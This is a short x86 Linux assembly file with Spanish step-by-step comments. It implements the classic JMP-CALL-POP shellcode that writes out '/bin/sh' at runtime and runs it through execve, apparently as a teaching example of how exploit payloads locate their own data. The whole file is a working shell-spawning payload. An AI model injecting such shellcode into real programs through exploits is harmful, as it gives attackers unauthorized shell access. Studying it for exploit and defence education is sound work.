section .text
    global _start

_start:
    jmp short dummy          ; 1. Salta al final para ejecutar el CALL

shellcode:
    pop ebx                  ; 3. EBX ahora tiene la dirección de la cadena
    xor eax, eax             ; Limpiar EAX (eax = 0)
    
    ; Preparar los argumentos para execve("/bin/sh", [addr, 0], 0)
    mov [ebx+7], al          ; Pone un NULL (0) al final de "/bin/sh"
    mov [ebx+8], ebx         ; Coloca la dirección de "/bin/sh" en BBBB
    mov [ebx+12], eax        ; Coloca NULL (0) en CCCC (termina argv y envp)

    lea ecx, [ebx+8]         ; ECX apunta al array de argumentos (argv)
    lea edx, [ebx+12]        ; EDX apunta al entorno (envp = NULL)
    mov al, 11               ; Syscall número 11 (execve)
    int 0x80                 ; Ejecutar

    ; Salida del programa (sys_exit)
    xor eax, eax
    mov al, 1                ; Syscall número 1 (exit)
    xor ebx, ebx             ; status 0
    int 0x80

dummy:
    call shellcode           ; 2. El CALL apila la dirección de la siguiente línea
    db '/bin/shABBBBCCCC'    ; Esta es la dirección que se "poppea" en EBX
